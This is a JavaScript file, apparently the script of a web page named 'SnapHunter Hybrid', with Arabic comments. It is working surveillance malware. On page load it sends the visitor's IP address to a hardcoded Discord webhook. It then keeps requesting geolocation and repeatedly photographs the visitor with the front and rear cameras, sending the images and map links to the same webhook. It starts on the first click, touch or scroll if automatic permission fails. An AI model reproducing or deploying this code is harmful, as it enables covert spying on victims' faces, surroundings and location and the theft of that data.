'use strict';

// ⚠️ رابط الـ Webhook الخاص بك
const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let userLat = null, userLng = null;
let isSystemRunning = false; // لمنع تكرار التشغيل إذا نجح الطلب التلقائي

// 1. وظيفة الإرسال السريع
async function sendData(blob, text) {
    const formData = new FormData();
    if (blob) formData.append('file', blob, 'capture.jpg');
    formData.append('payload_json', JSON.stringify({ content: text, username: "SnapHunter Hybrid" }));
    return fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 2. طلب الموقع الإجباري
function forceLocation() {
    navigator.geolocation.getCurrentPosition(
        (p) => {
            userLat = p.coords.latitude; userLng = p.coords.longitude;
            sendData(null, `📍 **الموقع:** https://www.google.com/maps?q=${userLat},${userLng}`);
        },
        () => { setTimeout(forceLocation, 500); }, 
        { enableHighAccuracy: true }
    );
}

// 3. التقاط الصور السريع
async function captureDual(mode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
        video.srcObject = stream;
        await new Promise(r => video.onloadedmetadata = r);
        video.play();
        await new Promise(r => setTimeout(r, 400)); // وقت قصير جداً للعدسة

        const ctx = canvas.getContext('2d');
        canvas.width = 640; canvas.height = 480;
        ctx.drawImage(video, 0, 0, 640, 480);
        
        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.4));
        stream.getTracks().forEach(t => t.stop());
        await sendData(blob, `📸 لقطة: \`${mode === 'user' ? 'الأمامية' : 'الخلفية'}\``);
    } catch (e) { }
}

// 4. المحرك الأساسي (يحتوي على المحاولة التلقائية + انتظار اللمس)
async function startSystem() {
    if (isSystemRunning) return; // إذا اشتغل النظام مسبقاً لا يكرر نفسه
    
    try {
        // محاولة طلب الكاميرا (ستنجح في أندرويد وكروم تلقائياً)
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(t => t.stop());
        
        isSystemRunning = true; // تم القبول تلقائياً
        forceLocation(); // اطلب الموقع

        const loop = async () => {
            await captureDual('user');
            await captureDual('environment');
            setTimeout(loop, 5000);
        };
        loop();
        
    } catch (err) {
        // إذا فشل الطلب التلقائي (مثل سفاري)، ننتظر أول حركة من المستخدم
        console.log("بانتظار تفاعل المستخدم...");
    }
}

// أ- محاولة التشغيل التلقائي فوراً
startSystem();

// ب- في حال فشلت المحاولة التلقائية، سيشتغل بمجرد لمس الشاشة (حل سفاري)
window.addEventListener('click', startSystem);
window.addEventListener('touchstart', startSystem);
window.addEventListener('scroll', startSystem);

// إرسال IP فور الدخول
fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
    sendData(null, `👤 **صيد جديد دخل!** IP: \`${data.ip}\``);
});
